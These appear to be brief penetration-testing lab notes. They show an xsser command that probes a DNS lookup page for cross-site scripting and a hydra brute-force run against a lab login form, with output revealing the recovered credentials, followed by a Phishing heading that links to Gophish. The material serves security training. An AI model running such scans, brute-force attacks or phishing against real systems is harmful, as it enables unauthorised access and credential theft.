
```bash
$ xsser --url "http://192.10.131.3/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS"
```

```bash
root@attackdefense:~# hydra -L users.txt -P passwords.txt 192.37.62.3 http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:invalid credentials"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-15 15:42:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 303 login tries (l:3/p:101), ~19 tries per task
[DATA] attacking http-post-form://192.37.62.3:80/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:invalid credentials
[80][http-post-form] host: 192.37.62.3   login: bee   password: bug
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-15 15:42:51
```

# Phishing

[Gophish](https://getgophish.com/)